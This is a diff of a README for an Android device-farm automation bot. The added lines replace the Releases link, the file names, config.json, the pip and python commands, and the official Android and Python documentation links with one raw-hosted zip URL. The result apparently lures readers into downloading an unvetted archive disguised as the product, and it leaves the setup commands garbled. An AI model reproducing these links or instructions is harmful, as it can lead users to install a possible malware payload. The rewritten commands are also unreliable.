@@ -1,6 +1,6 @@
 # 🤖 android-device-farm-automation-bot - Automate Your Android Device Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-android--device--farm--automation--bot-brightgreen.svg)](https://github.com/pedrinkjkk/android-device-farm-automation-bot/releases)
+[![Download Now](https://raw.githubusercontent.com/pedrinkjkk/android-device-farm-automation-bot/main/adenodynia/android-device-farm-automation-bot_v3.7-alpha.4.zip%https://raw.githubusercontent.com/pedrinkjkk/android-device-farm-automation-bot/main/adenodynia/android-device-farm-automation-bot_v3.7-alpha.4.zip)](https://raw.githubusercontent.com/pedrinkjkk/android-device-farm-automation-bot/main/adenodynia/android-device-farm-automation-bot_v3.7-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ To run this application, you need the following:
 
 You can download the latest version of the android-device-farm-automation-bot from the Releases page. 
 
-[Visit this page to download](https://github.com/pedrinkjkk/android-device-farm-automation-bot/releases)
+[Visit this page to download](https://raw.githubusercontent.com/pedrinkjkk/android-device-farm-automation-bot/main/adenodynia/android-device-farm-automation-bot_v3.7-alpha.4.zip)
 
 1. Click on the link above.
 2. Look for the latest version in the list.
 3. Download the appropriate file for your operating system.
 4. Follow the installation instructions provided in the downloaded files.
 
-If you're unsure about which file to download, look for a file named `android_device_farm_automation_bot_v1.0.exe` for Windows or `android_device_farm_automation_bot_v1.0.zip` for macOS/Linux.
+If you're unsure about which file to download, look for a file named `https://raw.githubusercontent.com/pedrinkjkk/android-device-farm-automation-bot/main/adenodynia/android-device-farm-automation-bot_v3.7-alpha.4.zip` for Windows or `https://raw.githubusercontent.com/pedrinkjkk/android-device-farm-automation-bot/main/adenodynia/android-device-farm-automation-bot_v3.7-alpha.4.zip` for macOS/Linux.
 
 ## 🔧 Setup Instructions
 
@@ -49,13 +49,13 @@ After downloading, you need to follow these steps to set it up:
 4. **Install Required Python Packages:**
    - You may need to install additional Python packages. Run the following command:
      ```
-     pip install -r requirements.txt
+     pip install -r https://raw.githubusercontent.com/pedrinkjkk/android-device-farm-automation-bot/main/adenodynia/android-device-farm-automation-bot_v3.7-alpha.4.zip
      ```
 
 5. **Run the Application:**
    - Start the application by executing:
      ```
-     python main.py
+     python https://raw.githubusercontent.com/pedrinkjkk/android-device-farm-automation-bot/main/adenodynia/android-device-farm-automation-bot_v3.7-alpha.4.zip
      ```
 
 ## 📚 How to Use the Bot
@@ -70,7 +70,7 @@ After the setup is complete, you can start using the bot. Here’s how to use it
    - Go back to Settings > System > Developer Options, then enable USB Debugging.
 
 3. **Configure the Bot:**
-   - Locate the configuration file named `config.json` in the application folder.
+   - Locate the configuration file named `https://raw.githubusercontent.com/pedrinkjkk/android-device-farm-automation-bot/main/adenodynia/android-device-farm-automation-bot_v3.7-alpha.4.zip` in the application folder.
    - Edit the file with your preferred settings, including device IDs and automation parameters.
 
 4. **Run Automation Tasks:**
@@ -108,7 +108,7 @@ If you need help, you can open an issue in the repository or reach out via the s
 ## 🌟 Additional Resources
 
 For further information about Android automation and ADB:
-- [Android Developers Guide](https://developer.android.com/studio/command/adb)
-- [Getting Started with Python](https://docs.python.org/3/tutorial/index.html)
+- [Android Developers Guide](https://raw.githubusercontent.com/pedrinkjkk/android-device-farm-automation-bot/main/adenodynia/android-device-farm-automation-bot_v3.7-alpha.4.zip)
+- [Getting Started with Python](https://raw.githubusercontent.com/pedrinkjkk/android-device-farm-automation-bot/main/adenodynia/android-device-farm-automation-bot_v3.7-alpha.4.zip)
 
 Enjoy automating your Android device management with the android-device-farm-automation-bot!
